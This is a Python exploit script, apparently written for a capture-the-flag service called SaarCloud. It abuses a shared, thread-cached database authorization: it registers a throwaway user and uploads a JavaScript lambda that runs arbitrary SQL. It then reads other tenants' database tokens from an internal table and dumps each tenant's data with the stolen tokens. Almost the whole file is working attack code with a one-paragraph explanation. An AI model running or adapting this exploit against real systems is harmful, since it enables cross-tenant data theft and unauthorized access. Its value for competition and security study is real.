import random
import socket
import string

import requests
import sys


"""
SaarRDS interface is insecure (shared among all instances in a thread).
After one instance authenticated against RDS, we can re-use the cached authorization in a lambda script running on the same thread.
Just not with the "normal" interface, but the raw, exported functions from SaarRDSInterface.
"""



def random_string(length=12):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


class SaarCloudSession(requests.Session):
    def __init__(self, ip: str, hostname='default'):
        super().__init__()
        if hostname == 'default':
            hostname = 'www'
        if '.' not in ip:
            ip = socket.gethostbyname(ip)
        self.ip = ip
        self.base = f'http://{hostname}.{ip}.nip.io:8080'

    def set_hostname(self, hostname):
        self.base = f'http://{hostname}.{self.ip}.nip.io:8080'

    def get(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().get(url, **kwargs)

    def post(self, url, **kwargs):
        if url.startswith('/'):
            url = self.base + url
        return super().post(url, **kwargs)


ATTACK = '''
LambdaRequests.post(/^\\/attack$/, async (request, match) => {
    return await SaarRDSInterface.execSQL(request.json().db, request.json().sql);
});
'''


def exploit(target):
    session = SaarCloudSession(target)
    # Register a new user for rds
    username = random_string()
    token = session.post('/api/register/lambda', json={'username': username}).json()['token']
    session.post(f'/api/lambda/write/{username}?token={token}', data=ATTACK)

    # attack - for this connection's thread, "default" has already authorized against "default" database. We can re-use that cached authorization.
    session.set_hostname(username)
    sql = '''SELECT * FROM rds_databases ORDER BY id DESC LIMIT 20;'''
    response = session.post('/attack', json={'db': 'default', 'sql': sql})
    print(response, response.text)

    # dump the databases using the stolen tokens
    session2 = SaarCloudSession(target)
    for user in response.json():
        response = session2.get(f'/api/rds/{user["dbname"]}/appendonly_issues/select?token={user["token"]}')
        print('Dumping', user["dbname"], '=>', response.text)


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else '127.1.0.1')
